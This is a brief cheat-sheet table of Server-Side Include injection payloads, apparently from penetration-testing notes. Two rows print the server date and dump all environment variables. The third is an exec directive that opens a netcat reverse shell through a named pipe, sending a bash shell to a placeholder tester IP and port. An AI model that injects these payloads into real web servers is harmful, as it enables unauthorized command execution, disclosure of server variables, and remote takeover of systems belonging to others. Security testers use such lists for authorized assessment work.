| **SSI Directive Payload**                                                                                   | **Description** |
| ----------------------------------------------------------------------------------------------------------- | --------------- |
| `<!--#echo var="DATE_LOCAL" -->`                                                                            | Date            |
| `<!--#printenv -->`                                                                                         | All variables   |
| `<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo\|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->` |                 |


